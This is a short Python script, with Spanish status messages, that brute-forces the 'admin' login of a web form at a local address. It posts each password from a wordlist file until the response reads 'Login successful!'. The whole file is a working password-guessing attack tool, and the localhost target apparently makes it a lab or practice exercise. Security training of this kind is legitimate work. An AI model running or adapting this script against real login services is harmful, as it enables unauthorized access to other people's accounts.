import requests

URL = "http://127.0.0.1:5000/"
USERNAME = "admin"
PASSWORD_FILE = "../passwords.txt"

def brute_force():
    with open(PASSWORD_FILE, 'r') as file:
        for line in file:
            password = line.strip()
            response = requests.post(URL, data={
                "username": USERNAME,
                "password": password
            })

            if "Login successful!" in response.text:
                print(f"[+] Contraseña encontrada: {password}")
                return
            else:
                print(f"[-] Fallo con: {password}")

    print("[-] Contraseña no encontrada.")

if __name__ == "__main__":
    brute_force()
